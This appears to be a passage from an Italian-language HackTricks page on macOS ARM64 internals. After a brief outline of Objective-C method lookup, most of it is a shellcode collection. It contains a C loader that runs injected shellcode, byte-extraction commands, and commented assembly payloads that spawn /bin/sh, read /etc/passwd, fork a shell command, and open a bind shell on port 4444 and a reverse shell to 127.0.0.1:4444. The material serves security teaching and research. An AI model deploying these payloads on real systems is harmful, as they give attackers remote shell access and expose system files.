Quando questa funzione viene chiamata, è necessario trovare il metodo chiamato dell'istanza indicata; per questo vengono eseguite diverse ricerche:

- Eseguire una lookup ottimistica della cache:
- Se ha esito positivo, terminare
- Acquisire runtimeLock (read)
- If (realize && !cls->realized) realize class
- If (initialize && !cls->initialized) initialize class
- Provare la cache della classe:
- Se ha esito positivo, terminare
- Controllare la method list della classe:
- Se trovata, popolare la cache e terminare
- Provare la cache della superclasse:
- Se ha esito positivo, terminare
- Controllare la method list della superclasse:
- Se trovata, popolare la cache e terminare
- If (resolver) try method resolver, and repeat from class lookup
- Se sei ancora qui (= tutto il resto ha fallito) provare il forwarder

### Shellcodes

To compile:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Per estrarre i byte:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Per macOS più recenti:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>Codice C per testare lo shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Tratto da [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) e spiegato.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Leggi con cat

L'obiettivo è eseguire `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, quindi il secondo argomento (x1) è un array di parametri (che in memoria significa uno stack degli addresses).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Invocare un comando con sh da un fork in modo che il processo principale non venga terminato
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell da [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) in **port 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Da [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell a **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
